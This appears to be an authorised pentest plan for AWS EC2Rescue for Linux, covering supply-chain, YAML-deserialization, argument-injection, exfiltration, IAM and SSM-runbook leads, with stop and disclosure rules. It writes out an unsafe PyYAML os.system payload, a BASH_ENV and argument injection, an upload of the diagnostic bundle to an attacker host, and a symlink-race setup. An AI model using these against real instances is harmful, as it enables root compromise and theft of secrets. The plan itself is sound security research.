# EC2Rescue for Linux — Attack Research Plan

**Source of leads:** AWS EC2 User Guide pages (offline mirror `/work/aws-docs/docs/AWSEC2/latest/UserGuide/` + online `docs.aws.amazon.com`):
`Linux-Server-EC2Rescue.html` (target), `ec2rl_install.html`, `ec2rl_working.html`, `ec2rl_moduledev.html`, `Windows-Server-EC2Rescue.html`; the SSM Automation runbooks `AWSSupport-TroubleshootSSH` and `AWSSupport-ExecuteEC2Rescue`; the EC2/EBS Service Authorization References; and the open-source repo `awslabs/aws-ec2rescue-linux` (GitHub).
**Status:** documentation-derived hypotheses, supplemented by **read-only source review** of the public `awslabs/aws-ec2rescue-linux` repo and the nested `AWSSupport-StartEC2RescueWorkflow` runbook docs. Several leads are **code-confirmed by reading** but **nothing has been executed/tested** against a live account, instance, or the S3 distribution bucket — every lead still requires live PoC confirmation on a disposable, in-scope target.

> **What this target IS.** EC2Rescue for Linux (`ec2rl`) is an **open-source, client-side diagnostic/remediation tool** the customer downloads and runs **inside their own EC2 Linux instance, frequently as root**. It is *not* a multi-tenant managed service — so the classic AWS lenses (cross-tenant IDOR, credential vending, control-ENI reach) mostly do **not** fire. The high-value surface is instead: (1) a **software supply chain** (a public S3 bucket + optional signature), (2) **arbitrary code execution as root** via its YAML module loader and shell/python module content, (3) **egress/exfiltration** of collected data via a caller-supplied upload URL, (4) **use of the instance's AWS credentials** to create/share AMIs & snapshots, and (5) two **AWS-authored SSM Automation runbooks** that install and drive it remotely — the only paths that cross an account/instance trust boundary.

---

## 0. How to use this document
- Each lead reads: **Claim → Mechanism (doc evidence) → Confirm/Refute oracle → Preconditions → Cost → Severity → Stop condition.** Work in priority order (Section 5 is ordered). Look left and right for adjacent bugs.
- **HARD STOP / disclosure:** The distribution bucket `s3://ec2rescuelinux` and the two `AWSSupport-*` runbooks are **AWS-owned service-plane artifacts.** The moment evidence shows the bucket is claimable/writable by a non-AWS principal, or a runbook's AWS-managed role grants more than its purpose, **stop, preserve evidence, and route to AWS Security** — do not exploit. Likewise if any credential/ARN belonging to AWS's own fleet appears.
- Leads are tagged `code-confirmed` (verified by reading `awslabs/aws-ec2rescue-linux` source — PoC only remains), `confirmed` (verified from the runbook/SAR docs), or `[src]`/doc-gap (needs further source/live confirmation). Where the docs are silent, a lead is marked **doc-gap — confirm surface first**, not "N/A".

---

## 1. Pentest Objectives (boundary-breach goals, concrete outcomes)
1. **Supply-chain RCE:** Obtain code execution on an instance that follows the documented install (`curl …/ec2rl.tgz`) by controlling, tampering with, or taking over the `ec2rescuelinux` S3 distribution or its transport — *without* the user's optional GPG step catching it.
2. **Local privilege escalation to root:** As a non-root user on an instance with `ec2rl` present, achieve root code execution via a malicious/crafted module, YAML deserialization, CLI-argument injection into module scripts, or a predictable-path/symlink race in `/var/tmp/ec2rl`.
3. **Data exfiltration:** Cause `ec2rl`'s collected bundle (logs, config, possibly secrets) to egress to a non-AWS, attacker-chosen destination via `--support-url` / `--presigned-url`, or have it written somewhere another principal can read.
4. **Over-privileged AWS actions:** Use the `--backup` path's instance-profile credentials to create, copy, or **share cross-account** AMIs/snapshots beyond the instance's own volumes, or to act with a role the operator did not intend.
5. **Control-/cross-instance breach via SSM:** Through `AWSSupport-ExecuteEC2Rescue` / `AWSSupport-TroubleshootSSH`, read data from an instance's root volume by attaching it to a helper instance, or abuse the runbook's AssumeRole / PassRole / output-bucket parameters to cross an account or instance boundary.

---

## 2. Components, Assets, and Design

**Mechanism (not marketing):**
- **`ec2rl` CLI** — a Python 2.7.9+/3.2+ program (`ec2rl.py` → `ec2rlcore/*`). Two builds: **standard** (needs host Python) and **bundled** (ships a minimal Python). Run from an unpacked tarball directory as `./ec2rl …`.
- **Modules** — "over 100" YAML files (`mod.d/*.yaml`), each a single YAML document tagged `!ec2rlcore.module.Module` whose `content` attribute is an **inline BASH or Python script**. Attributes include `placement` (prediagnostic/run/postdiagnostic), `language`, `sudo` (run as root), `remediation` (True = it *changes* the system), `required`/`optional` (CLI args the script consumes), `software`/`package` (external executables, with a `package` URL field), `perfimpact`, `parallelexclusive`.
- **Runtime workdir** — `/var/tmp/ec2rl` (`EC2RL_WORKDIR`), per-run `/var/tmp/ec2rl/<date&timestamp>` (`EC2RL_RUNDIR`), gathered output under `…/mod_out/gathered/`. Modules read env vars `EC2RL_CALLPATH`, `EC2RL_SUDO`, `EC2RL_VIRT_TYPE` ("as provided by the instance metadata"), `EC2RL_NET_DRIVER`, `EC2RL_INTERFACES`.
- **Upload** — `./ec2rl upload --upload-directory=… --support-url="…"` **or** `--presigned-url="…"`. Sends a collected bundle to a URL. `--support-url` is "provided by Support"; `--presigned-url` is a customer S3 presigned PUT.
- **Backup** — `./ec2rl run --backup=ami|allvolumes|<vol-id>` creates an AMI or EBS snapshot(s) of attached volumes — i.e. the tool calls EC2 control-plane APIs using whatever credentials are available in the instance (instance profile via IMDS).
- **Distribution** — `https://s3.amazonaws.com/ec2rescuelinux/ec2rl.tgz` (+ `.sha256`, `.sig`, `.key`). Path-style, global-namespace S3 bucket `ec2rescuelinux`. Bundled build + source: GitHub `awslabs/aws-ec2rescue-linux`.
- **Remote drivers (AWS-authored):** SSM Automation runbooks `AWSSupport-TroubleshootSSH` (installs ec2rl, checks/fixes SSH) and `AWSSupport-ExecuteEC2Rescue` (Windows-oriented hub note, but the ExecuteEC2Rescue family detaches an impaired instance's root volume and attaches it to a **helper instance** to run EC2Rescue against it).

**Identity / privilege model:**
- No tenants, no login. Privilege is **OS-level** (root vs non-root; `sudo`/`EC2RL_SUDO`) and **AWS-level** (the instance profile the `--backup` path and the SSM runbooks use).
- "Trust" in the supply chain is established by an **optional** GPG signature (`ec2rl.key`/`.sig`) and a SHA-256 file — both fetched from the **same bucket** as the tarball.

**ASCII pipeline:**
```
                    (1) INSTALL / SUPPLY CHAIN
   s3://ec2rescuelinux/ec2rl.tgz(.sha256/.sig/.key)  --curl-->  instance disk
   GitHub awslabs/aws-ec2rescue-linux (bundled build) --------> instance disk
                         |  (GPG verify = OPTIONAL)
                         v
   (2) EXECUTION (often as root)
   ./ec2rl run  --> YAML module loader (!ec2rlcore.module.Module)  --> bash/python `content`
        ^   \                                   |                         |
   CLI args  \--- --only-modules, --<arg> ------/                         | reads IMDS (EC2RL_VIRT_TYPE)
        |                                                                 v
        |                                   /var/tmp/ec2rl/<ts>/mod_out (world-readable? collected secrets)
        |
   (3) UPLOAD                         (4) BACKUP (instance-profile creds via IMDS)
   ./ec2rl upload --support-url=URL      ./ec2rl run --backup=ami|allvolumes|<vol>
        |  --presigned-url=URL                 |  ec2:CreateImage / CreateSnapshot(s) / CreateTags ...
        v                                       v
   attacker/Support host (egress of bundle)   customer account EC2 control plane

   (5) REMOTE DRIVE (crosses account/instance boundary)
   SSM Automation: AWSSupport-TroubleshootSSH / -ExecuteEC2Rescue
        AutomationAssumeRole --> target instance (install+run ec2rl)
        ExecuteEC2Rescue: stop impaired inst -> detach root EBS -> ATTACH to helper inst -> read
```

**Mandatory coverage sweep — pages read & field roles classified:**
- `ec2rl_install.md`: install `curl` commands (4 S3 URLs), optional GPG verify, bundled build GitHub link → **supply chain (EE/Y/U)**.
- `ec2rl_working.md`: `--only-modules`, `--<arguments>` (e.g. `--domain=`, `--times=`, `--period=`), `--support-url`, `--presigned-url`, `--upload-directory`, `--backup=` → **F (injection), G (egress), B/R (IAM)**.
- `ec2rl_moduledev.md`: module YAML schema, custom tag `!ec2rlcore.module.Module`, inline `content` script, `sudo`/`remediation`/`package` URL, env vars incl. IMDS-sourced `EC2RL_VIRT_TYPE` → **F (deserialization + command injection), privilege (E), M (paths)**.
- `Linux-Server-EC2Rescue.md` + `Windows-Server-EC2Rescue.md`: hub, SSM runbook pointers, Windows "examine EBS root volumes from other instances" → **SSM/cross-instance (D/V/AA)**.
- Service Authorization Reference `list_ec2.md` / `list_ebs.md`: condition-key coverage for `CreateImage`/`CreateSnapshot(s)`/`ModifySnapshotAttribute`/`AttachVolume` → **R/S/X**.

**Fields whose value is a location the tool dereferences:** `--support-url`, `--presigned-url`, module `package` URL, the four install URLs. **Blobs parsed:** YAML modules (`content`), collected log files, the downloaded tarball. **Secrets persisted:** collected bundle under `/var/tmp/ec2rl` (may contain credentials/keys from logs). **Guarantee words:** install page's "authenticate the identity of the software publisher and check that the application has not been altered" — enforced only by an **optional** manual GPG step.

---

## 3. API / Interface Inventory

This is a CLI tool, not a web API. "Interfaces" = CLI verbs/args, the install endpoints, and the SSM runbooks.

| Interface | Kind | Mutating? | External-facing? | Functionality | Reachable by | Notes / lens |
|---|---|---|---|---|---|---|
| `./ec2rl run` | CLI | yes (remediation modules change system) | no (local) | run all/selected modules | local user (root for `sudo` modules) | F, E, M |
| `./ec2rl run --only-modules=X --<arg>=V` | CLI | yes | no | run module, pass args into script | local user | **F — arg → shell injection** `[src]` |
| `./ec2rl run --backup=ami\|allvolumes\|<vol>` | CLI | **yes (AWS)** | calls EC2 API | create AMI/snapshot(s) | local user + instance profile | **B/R/X — IAM scope** `[src]` |
| `./ec2rl upload --support-url=URL` | CLI | no (egress) | **yes (outbound)** | POST bundle to URL | local user | **G — exfil / URL validation** `[src]` |
| `./ec2rl upload --presigned-url=URL` | CLI | no (egress) | **yes (outbound)** | PUT bundle to presigned S3 | local user | G — presigned carries signer identity |
| module `content` (bash/python) | embedded code | yes | no | arbitrary script, run as root if `sudo` | module author / whoever drops a module | **F — deserialization/RCE** `[src]` |
| custom module dir / `mod.d/` | loader input | n/a | no | YAML modules loaded & instantiated | local write access | **F/EE — load path** `[src]` |
| `GET s3://ec2rescuelinux/ec2rl.tgz(.sha256/.sig/.key)` | HTTPS download | n/a | **yes (inbound code)** | fetch tool + integrity material | anyone installing | **EE/Y/U — supply chain** |
| `AWSSupport-TroubleshootSSH` | SSM Automation | yes | control-plane | install+run ec2rl to fix SSH; offline path gated by `AllowOffline=true`+`FixAll` | caller w/ runbook perms + AssumeRole | **R/B — AWS-authored** |
| `AWSSupport-ExecuteEC2Rescue` | SSM Automation | yes | control-plane | thin OS-branch wrapper → delegates to StartEC2RescueWorkflow | caller w/ runbook perms + AssumeRole | **D/V/AA** |
| **`AWSSupport-StartEC2RescueWorkflow`** | SSM Automation (engine) | **yes** | control-plane | detach target root vol → attach to helper → **run caller `OfflineScript` as root on mounted FS** | caller w/ `ssm:StartAutomationExecution` + AssumeRole | **B/E/D/V/AA/R — the critical runbook (Area 6)** |
| Windows `EC2RescueCmd.exe /offline:<dev>` / `AWSSupport-RunEC2RescueForWindowsTool` FixAll | tool/SSM | yes | local+SSM | examine a **foreign** instance's EBS root volume (registry hives, memory dumps) attached to a helper | local admin on helper / SSM caller | **D/V — cross-instance data read** |

**Undocumented/console-hidden knobs to enumerate from source:** the full `./ec2rl` sub-command and option set beyond the three documented verbs (`run`/`upload`/`help`/`list`), any `--module-dir`/custom-module flag, any flag that disables signature/host checks, and the exact set of modules whose `remediation: True` changes the system.

---

## 4–5. Recommended Areas of Focus (firing lenses, priority-ordered)

> Priority rule applied: supply-chain + RCE-as-root first (highest blast radius, affects every install); then local privesc and credential/egress; then the SSM/cross-instance boundary; then IAM-artifact audit; then lower-severity hardening. Tags: `code-confirmed` = verified by source reading (PoC only remains); `confirmed` = verified from runbook/SAR docs; `[src]`/doc-gap = needs further confirmation.

### Area 1 — Software supply chain of the distribution bucket (Lens EE + Y + U) — **PRIORITY 1**
**Background.** The documented install is `curl -O https://s3.amazonaws.com/ec2rescuelinux/ec2rl.tgz` (+ `.sha256`, `.sig`, `.key`). All four objects live in **one global-namespace, path-style S3 bucket `ec2rescuelinux`**. Signature verification is an explicitly **(Optional)** step, and the SHA-256 file sits in the *same* bucket as the artifact it attests.
**Security Concern.** If the bucket name is ever unclaimed/claimable, writable by a non-AWS principal, or served from a region/endpoint an attacker can influence, a tampered `ec2rl.tgz` executes on every instance that follows the docs — and the co-located `.sha256` would be replaced in lockstep, so integrity checking against it is worthless. Because GPG is optional and manual, most runs skip the only real authenticity control. This is an **AWS-owned service-plane artifact** (install command printed verbatim in AWS docs).
**High-level Test Scenarios (falsifiable):**
- **Claim:** The `ec2rescuelinux` bucket is not provably AWS-owned/locked against takeover. **Oracle:** verify bucket ownership/region, `HEAD` for existence, and whether `s3:PutObject`/listing is denied to anonymous and arbitrary accounts; a 404/NoSuchBucket or any write-accept = critical supply-chain exposure. **DOC/RECON ONLY — do not write to the bucket; if it appears claimable, STOP and disclose.**
- **Claim:** Integrity material is co-located, so `.sha256` adds no real protection vs a bucket/transport compromise. **Oracle:** confirm `.sha256` and `.tgz` share the bucket; confirm the docs never require GPG. (Confirmed from docs.)
- **Claim:** The optional GPG key (`2FAE2A1C`, subkey `6991ED45`) is the only authenticity anchor and the docs even show the "not certified / no ultimately trusted keys" warnings as *expected* — training users to ignore trust warnings. **Oracle:** doc review (confirmed); the SSM Distributor install path performs no documented GPG step either — resolve whether Distributor's own signing covers it (open gap).
**Severity-if-true:** bucket takeover / write = **Critical** (root RCE on every install; service-plane → disclose). Co-located-hash / optional-sig = **High** design weakness.
**Stop condition:** existence + ownership + anonymous-write posture established. No writes, ever.

### Area 2 — YAML module deserialization → RCE on *any* `ec2rl` invocation (Lens F) — **PRIORITY 1** `code-confirmed`
**Background.** Modules are YAML documents tagged **`!ec2rlcore.module.Module`**; `content` is an inline script `ec2rl run` executes (root when `sudo: True`). **Source review of `ec2rlcore/module.py` confirms the loader is PyYAML's full/unsafe `Loader`/`CLoader`** (`from yaml import CLoader as Loader` … `yaml.load(config_file, Loader=Loader)`), *not* `safe_load`. The custom tag is registered *on top of* the unsafe Loader, so all other tags (`!!python/object/apply:…`) remain reachable. `ec2rlcore/moduledir.py` iterates `os.listdir("<CALLPATH>/mod.d")` and calls `get_module()` on **every** `*.yaml` — i.e. parsing happens unconditionally on `ec2rl list`/`help`/`run`.
**Security Concern.** **Merely parsing a crafted file in `mod.d/` executes code — no module selection or "run" needed, and the custom tag is not even required.** A file beginning `--- !!python/object/apply:os.system ["id > /tmp/pwned"]` runs on `yaml.load()`. Any attacker with a **file-write primitive into the installed `mod.d/`** (world-writable install dir, untrusted extraction/update, running from a `/tmp` staging dir, or the `0o777` workdir of Area 8) gets code execution as the invoking user — **root**, since `ec2rl` is routinely run as root. No `--module-dir` override exists; the dir is derived from `sys.argv[0]`.
**High-level Test Scenarios (falsifiable):**
- **Claim:** parsing an attacker file in `mod.d/` executes code with no run/selection. **Oracle (confirmed design):** on a disposable VM drop `mod.d/zzpwn.yaml` = `--- !!python/object/apply:os.system ["id > /tmp/pwned"]`, run `ec2rl list`, check `/tmp/pwned`. **Severity: Critical.**
- **Claim:** a non-root user who can write `mod.d/` (or redirect it via the `0o777` workdir, Area 8) escalates when root next runs `ec2rl`. **Oracle:** verify install-dir perms + the CALLPATH derivation. **Severity: Critical (local privesc).**
- **Claim:** `remediation: True` modules change the system; a crafted one is persistence. **Oracle:** enumerate shipped remediation modules.
**Severity-if-true:** **Critical** (root RCE / local privesc). **Stop condition:** one benign canary marker file; do not weaponize.

### Area 3 — CLI arg → arbitrary env var (`BASH_ENV`) + unquoted expansion in modules (Lens F) — **PRIORITY 1** `code-confirmed`
**Background.** `./ec2rl run --only-modules=dig --domain=amazon.com` passes args into modules. **Source review confirms:** `ec2rlcore/options.py` `cmdline()` registers *any* `--foo` dynamically, validating only the arg **name** regex — **no value validation**. `ec2rlcore/module.py` `run()` then injects **every** `--key=value` verbatim as an environment variable `key` into **every** module subprocess (`envlist[option]=optionvalue`), regardless of the module's declared `required`/`optional`. Modules run via `subprocess.check_output(["/bin/bash", module_file], env=envlist)` — no `shell=True`, but module `content` interpolates vars unquoted (e.g. `mod.d/dig.yaml`: `dig @169.254.169.253 $domain $record`; `gcore.yaml`: `gcore -o … $pid`).
**Security Concern.** Two confirmed primitives: (1) **`BASH_ENV` injection** — `--BASH_ENV=/tmp/evil.sh` becomes an env var bash honors for non-interactive scripts, sourcing attacker code **before** any module content runs; (2) **argument injection** via unquoted `$domain`/`$record`/`$pid` (e.g. `--domain='-f /etc/passwd'` smuggles a flag into `dig`). When `ec2rl` is run as root (locally or via the SSM `OfflineScript`/`sudo ec2rl` wrapper that passes through user-influenced `--` flags), either becomes **root code/command execution driven purely by an argument**.
**High-level Test Scenarios (falsifiable):**
- **Claim:** `--BASH_ENV=/tmp/poc.sh` sources attacker code into module subprocesses. **Oracle:** `./ec2rl run --only-modules=dig --domain=example.com --BASH_ENV=/tmp/poc.sh` with `poc.sh`=`touch /tmp/env_poisoned`; check marker. **Severity: High–Critical (Critical if root/SSM).**
- **Claim:** unquoted `$domain` enables `dig` argument injection. **Oracle:** `--domain='-f /tmp/x'` + `strace -f -e execve` on the child. **Severity: Medium–High.**
- **Claim:** SSM/`sudo` wrappers forward lower-trust values into these args. **Oracle:** cross-check whether `OfflineScript`/support wrappers template user input into `ec2rl` flags.
**Severity-if-true:** **High–Critical.**

### Area 4 — Collected-bundle exfiltration via unvalidated `--presigned-url` (Lens G) — **PRIORITY 1** `code-confirmed`
**Background.** `./ec2rl upload --upload-directory=… --presigned-url="…"` or `--support-url="…"`. **Source review of `ec2rlcore/s3upload.py` confirms:** `--presigned-url` is used **directly** as the PUT target (`requests.put(url=presigned_url, data=payload)`) with **no scheme check, no host allowlist, no private/link-local/loopback block**, and redirects follow `requests` defaults; `http://` and arbitrary attacker IPs are accepted. `--support-url` is first exchanged at a hardcoded AWS endpoint (`https://30yinsv8k6.execute-api.us-east-1.amazonaws.com/prod/get-signed-url`) for a presigned URL, then uploaded identically. `make_tarfile()` tars the **entire RUNDIR** — which can include `environment.yaml` (an `env` dump → secrets), `gcore` **process memory dumps** (credentials in memory), logs, network tables.
**Security Concern.** `--presigned-url` is a **by-design, unvalidated user-controlled egress primitive.** Any flow where a lower-trust party supplies the URL (a help-desk tool templating `--presigned-url=<input>`, a social-engineered operator, or the SSM path) exfiltrates the full diagnostic bundle — including potential secrets/memory dumps — to an attacker host over plain HTTP, with no warning.
**High-level Test Scenarios (falsifiable):**
- **Claim:** `--presigned-url` accepts an arbitrary HTTP/private/link-local host with no validation. **Oracle (confirmed design):** run `ec2rl run` then `ec2rl upload --presigned-url=http://<interactsh>/x`; observe the full tarball (incl. `environment.yaml` output) arrive over plain HTTP. **Severity: High.**
- **Claim:** a `169.254.169.254`/internal target is reachable from a privileged context. **Oracle:** point `--presigned-url` at a link-local target. **Severity: escalate per Lens G — HARD STOP if it implicates AWS fleet identity.**
- **Claim:** the bundle is world-readable at rest (chains Area 8). **Oracle:** check `/var/tmp/ec2rl` perms (confirmed `0o777`, Area 8).
**Severity-if-true:** data exfil of sensitive logs/memory = **High**.

### Area 5 — `--backup` → snapshot/AMI IAM scope → cross-account exfil chain (Lens B / R / S / X) — **PRIORITY 1** `[src for IMDS] + confirmed from SAR`
**Background.** `--backup=ami|allvolumes|<vol-id>` makes `ec2rl` call EC2 control-plane APIs (`CreateImage`/`CreateSnapshot`/`CreateSnapshots`/`CreateTags`) using the instance-profile credentials from IMDS. **Confirmed from the EC2 Service Authorization Reference (`list_ec2.md`):**
- `CreateImage` requires resource-level perms **simultaneously** on `image*`, `instance*`, **and** `snapshot*`; `CreateSnapshot` on `snapshot*`+`volume*`; `CreateSnapshots` on `instance*`+`snapshot*`+`volume*`.
- **There is NO condition key that binds "the volume/instance being acted on" to "the caller's own instance-id"** — no `ec2:SourceInstanceARN`, no principal-to-resource self-match. True "self-only" scoping requires full ABAC (tag every volume with its owner-instance + instance-role session tags), which is **not automatic and not EC2Rescue-driven**. In the common case the backup instance role therefore carries `Resource:"*"` on volume/snapshot/image.
- `ec2:ModifySnapshotAttribute` is classified by AWS as **"Permissions management"** (not merely Write); its condition keys include `ec2:Add/userId` and `ec2:Add/group` — i.e. adding an arbitrary account ID (or `group=all`) is how a snapshot is shared cross-account / made public, and the source snapshot carries **no `aws:ResourceTag` ownership requirement** on `CopySnapshot`.
**Security Concern.** A `Resource:"*"` backup role lets any process holding the instance creds (local attacker, SSRF-to-IMDS, RCE in a co-resident app) (1) `CreateSnapshot` of **any** volume in the account/region — not just the caller's own — then (2) `ModifySnapshotAttribute --add userId=<attacker-acct>` (or `group=all`) to **share the snapshot cross-account**, achieving full volume-data exfiltration of unrelated instances. If the tool also reads **IMDSv1** (no token), the role-theft precondition is trivially met by any SSRF primitive.
**High-level Test Scenarios (falsifiable):**
- **Claim:** `ec2rl --backup` uses IMDSv1. **Oracle (confirmed from source):** `ec2rlcore/awshelpers.py` does an **IMDSv1 GET first, falling back to a v2 token only on HTTP 401** — on any instance where IMDSv1 is enabled it never uses v2. `backup.py` uses boto3's default credential chain and calls `create_snapshot`/`create_image(NoReboot=True)`. **Severity: High (role-theft precondition met by any SSRF).**
- **Claim:** the documented/typical backup role uses `Resource:"*"` for snapshot/image actions (no self-binding key exists). **Oracle:** confirmed from `list_ec2.md` — no self-referential condition key; verify any AWS-published sample backup policy. **Severity: High.**
- **Claim (chain):** `CreateSnapshot(*) → ModifySnapshotAttribute(add userId)` shares a *foreign* instance's volume cross-account. **Oracle:** under a scoped role holding exactly the backup policy, `SimulatePrincipalPolicy` first; a live PoC would snapshot a canary volume then share to a second in-scope account — **but stop at the simulate/own-canary step; do not touch non-owned volumes.** **Severity: Critical.**
- **Claim (Lens X twin):** `ebs:GetSnapshotBlock` (Read, `snapshot*`) reaches snapshot bytes an `ec2:*` control check would scope. **Oracle:** compare `ebs:GetSnapshotBlock` (list_ebs.md) vs `ec2:CopySnapshot` authz on a shared snapshot. **Severity: High.**
**Severity-if-true:** cross-account snapshot/AMI share = **Critical**; IMDSv1 creds theft = High.
**Doc-gap:** the SAR pages carry no abuse-case warning about the `CreateSnapshot→ModifySnapshotAttribute` cross-account chain; and `--presigned-url` upload does **not** use the instance role at all (the presigned URL embeds the *signer's* identity — a bearer capability; whoever reads it from `ps`/shell history/logs can upload to that key from anywhere, and CloudTrail credits the signer, not the instance — an attribution gap).

### Area 6 — SSM `AWSSupport-StartEC2RescueWorkflow` engine: `OfflineScript` arbitrary-root access to any named instance's root volume (Lens B/E + D/V + AA + R) — **PRIORITY 1** `confirmed from runbook docs`
**Background.** `AWSSupport-TroubleshootSSH` → `AWSSupport-ExecuteEC2Rescue` → **`AWSSupport-StartEC2RescueWorkflow`** (the real engine, not named in the task but load-bearing). The engine: (1) asserts the target root volume is EBS and **not encrypted** (the one hard gate; encrypted root volumes are categorically unsupported), (2) deploys a CloudFormation stack creating a **helper instance in the SAME customer account** (new VPC/subnet by default), (3) runs an opaque "input validation" Lambda pulled from the AWS-owned, **non-account-scoped** `awssupport-ssm.*` S3 bucket, (4) stops the target, optionally creates a pre-backup AMI, (5) **detaches the target's root volume and attaches it to the helper**, (6) runs the **caller-supplied, required `OfflineScript` (base64 Bash/PowerShell) as root on the helper with the target's filesystem mounted/chroot-ready** (`EC2RESCUE_OFFLINE_SYSTEM_ROOT=/mnt/mount`, `EC2RESCUE_OFFLINE_DEVICE`, `EC2RESCUE_SOURCE_INSTANCE`, `EC2RESCUE_ACCOUNT_ID`), (7) reattaches the volume and tears down the stack — **but leaves any pre/post backup AMIs behind** ("It is your responsibility to secure access to the AMI, or to delete it").
**Security Concern.** `OfflineScript` is, by design, an **arbitrary-root-code-execution primitive against the full root filesystem of any unencrypted-root EC2 instance the caller can name by `InstanceId`** — secrets, SSH host keys, credential caches, app config — running under the dynamically-created `AWSSupport-EC2Rescue-*` helper role, **not** the target's role. The docs describe **no instance-ownership/ACL check** tying the caller to the target instance: isolation is 100% delegated to customer IAM (e.g. a `ec2:ResourceTag` condition on who may pass the AssumeRole against which `InstanceId`). The engine's own IAM policy requires `iam:CreateRole`/`AttachRolePolicy`/`PutRolePolicy`/**`PassRole`** scoped to `AWSSupport-EC2Rescue-*`, plus `ec2:Create*` networking on **`Resource:"*"`**.
**High-level Test Scenarios (falsifiable):**
- **Claim (data exfil):** a principal with `ssm:StartAutomationExecution` on the workflow + a usable AssumeRole can target an `InstanceId` it does not operationally own and recover that instance's filesystem via `OfflineScript` (write to a caller-chosen `S3BucketName`, or surface via `GetAutomationExecution` output). **Oracle:** confirm the absence of any caller↔target ownership binding in the runbook; in a live test, target only an **in-scope canary instance you own**. **Severity: Critical.**
- **Claim (orphaned AMI):** `CreatePreEC2RescueBackup`/`CreatePostEC2RescueBackup=true` leaves a full-root-volume AMI that persists with no automation-side ACL — reachable by a broader principal set than the original instance. **Oracle:** confirmed from doc text; verify post-run `DescribeImages`/`ModifyImageAttribute` reachability. **Severity: Medium–High.**
- **Claim (role-name collision):** caller-overridable `UniqueId` (default = execution id) breaks the uniqueness assumption behind the wildcard `AWSSupport-EC2Rescue-*` role/profile/Lambda names → a second run reuses/`PutRolePolicy`-escalates a role left behind by incomplete cleanup. **Oracle:** behavioral — repeat runs with a fixed `UniqueId`, observe role reuse/cleanup atomicity. **Severity: Medium–High (hypothesis).**
- **Claim (confused-deputy exfil):** the automation's own role (not a presigned URL) performs the `PutObject` of logs to a caller-chosen `S3BucketName`. **Oracle:** the published min-policy has **no `s3:PutObject`** despite three S3 parameters — resolve which identity writes. **Severity: High if the automation role writes directly; else informational.**
**Severity-if-true:** cross-instance/cross-account root-FS read = **Critical**; orphaned AMI / role collision = Medium–High.
**Stop condition:** target only owned canary instances; the moment evidence shows reach into a volume/instance you do not own, STOP and disclose.

### Area 7 — AWS-authored IAM artifacts for the SSM runbooks & backup policy (Lens R / S) — **PRIORITY 2** `confirmed`
**Background.** The engine's documented minimum policy is **hand-assembled by the customer from a JSON block AWS publishes** — there is **no AWS-managed least-privilege policy** for this use case (only the generic `AmazonSSMAutomationRole` + a custom inline policy). Customers copy it verbatim.
**Security Concern (statement-by-statement):**
- `iam:PassRole` + `CreateRole`/`AttachRolePolicy`/`PutRolePolicy` scoped to `AWSSupport-EC2Rescue-*` — a role-name prefix a low-priv holder may be able to satisfy → self-escalation vector; audit whether the prefix is forgeable.
- `ec2:Create*` networking statements on **`Resource:"*"`** (full account-wide EC2-networking wildcard, no tag/condition).
- `s3:GetObject` on `arn:aws:s3:::awssupport-ssm.*/*.template|*.zip` — **no account-ID placeholder**, an AWS-owned/shared bucket-name pattern → Lens EE/supply-chain question: who can write to `awssupport-ssm.*`, and what template/Lambda does the engine then execute? (Area 1 land-grab shape.)
- **Anomaly:** no `s3:PutObject*` anywhere despite `S3BucketName`/`LogDestination`/`S3Prefix` → the log-write identity/mechanism is undocumented (either presigned-URL out-of-band, bypassing the AssumeRole IAM entirely, or the published policy is incomplete).
**Oracle:** resolve the actual JSON; `iam:SimulatePrincipalPolicy` under a role holding exactly the artifact as the safe first oracle; audit the `AWSSupport-EC2Rescue-*` naming for a privesc path and the `awssupport-ssm.*` bucket ownership.
**Severity-if-true:** non-admin→admin privesc via PassRole/role-name = High; wildcard networking / shared-bucket code source = Medium–High. **In scope because AWS-authored and copy-verbatim.**

### Area 8 — World-writable predictable workdir / symlink race (Lens M, local) — **PRIORITY 2** `code-confirmed`
**Background.** Fixed, predictable `/var/tmp/ec2rl` (`EC2RL_WORKDIR`), run dirs under `…/<date&timestamp>`, created/written by root.
**Security Concern.** **Source review of `ec2rlcore/main.py` `_setup_write_paths()` confirms:** it does `os.mkdir(WORKDIR)` then **`os.chmod(WORKDIR, 0o777)`**, and **swallows `OSError` when the dir already exists (`errno.EEXIST`) without any `os.path.islink()` / ownership / mode re-check.** So a low-priv user can pre-create `/var/tmp/ec2rl` as a **symlink** (redirecting root-collected diagnostics to an arbitrary path → arbitrary-file-write-as-root) or simply exploit the `0o777` mode to read/tamper with every run's output (incl. `environment.yaml` secrets, `gcore` memory dumps). Notably the **backup subsystem** (`prediag.py`) *does* `islink()`-check and uses `0o700` — a telling contrast showing the core WORKDIR path is the weaker one. This workdir is also a clean feeder for the Area 2 YAML-RCE write primitive.
**Oracle (confirmed design):** as a low-priv user `mkdir /var/tmp/ec2rl; chmod 777` (or symlink it) *before* `sudo ec2rl run`; confirm reuse with no ownership complaint and that the low-priv user can read/race the output.
**Severity-if-true:** symlink-to-root-write = **High**; info disclosure of collected secrets = Medium.

### Area 9 — `package`/`software` module fields fetching external code (Lens G/EE, secondary) — **PRIORITY 3** `[src]`
**Background.** A module's `package` attribute carries "a URL for downloading or getting further information"; `software` lists executables EC2Rescue "ensures are present and executable before running."
**Security Concern.** If any flow auto-fetches from a module `package` URL, that is a second supply-chain seam; if `software` presence checks can be satisfied by a PATH-planted binary, that is local hijack.
**Oracle:** confirm whether `package` URLs are ever auto-downloaded, and how `software` executables are resolved (absolute path vs PATH lookup). `[src]`
**Severity-if-true:** Medium (depends on whether fetch/exec is automatic).

---

## 6. Threat Model Test Objectives

| Threat / Test case | Component | Documented mitigation to attack |
|---|---|---|
| Tampered tool executes on install | `ec2rescuelinux` S3 bucket, `curl` install | Optional GPG signature; co-located SHA-256 |
| Arbitrary Python exec on YAML load | module loader (`module.py`) | custom-constructor "safety" (assumed, unverified) `[src]` |
| Root RCE via module `content` / CLI args | `ec2rl run`, module scripts | `sudo` gate only decides *whether* to run as root, not input safety |
| Exfil of collected bundle | `ec2rl upload --support-url` | none documented (URL is operator-supplied) |
| Cross-account snapshot/AMI share | `--backup` + instance role | relies on instance-role least privilege; **no self-binding condition key exists** (confirmed) |
| Cross-instance root-FS read via `OfflineScript` | `AWSSupport-StartEC2RescueWorkflow` | **no caller↔target ownership check documented**; only `AutomationAssumeRole`/customer IAM |
| Cross-instance volume read (Windows) | `/offline:` + helper instance | volume attach/detach IAM (not scopable to "own" volume) |
| Orphaned backup AMI persists | `CreatePre/PostEC2RescueBackup` | "your responsibility to secure/delete" — no automation ACL |
| Code pulled from shared `awssupport-ssm.*` bucket | engine CFN/Lambda source | bucket not account-scoped in IAM policy (ownership undocumented) |
